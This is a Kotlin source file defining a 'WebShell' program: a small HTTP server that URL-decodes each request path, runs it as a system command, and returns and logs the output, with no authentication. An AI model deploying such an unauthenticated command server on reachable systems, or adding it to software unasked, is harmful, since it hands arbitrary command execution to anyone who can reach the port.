package by.next.way.shell

import com.sun.net.httpserver.HttpServer
import org.apache.logging.log4j.LogManager
import java.io.PrintWriter
import java.net.InetSocketAddress
import java.net.URLDecoder

object WebShell {

    private val log = LogManager.getLogger()

    @JvmStatic
    fun main(args: Array<String>) {
        val port = if (args.isNotEmpty()) args[0].toInt() else 1234
        log.info("Start web shell on http://localhost:$port/uname")
        HttpServer.create(InetSocketAddress(port), 0).apply {
            createContext("/") { http ->
                http.responseHeaders.add("Content-type", "text/plain")
                http.sendResponseHeaders(200, 0)
                PrintWriter(http.responseBody).use { out ->
                    val command = URLDecoder.decode(http.requestURI.toString(), "utf-8").substring(1)
                    val result = Shell.exec(command)
                    out.println(result)
                    log.info("$command -> $result")
                }
            }
            start()
        }
    }
}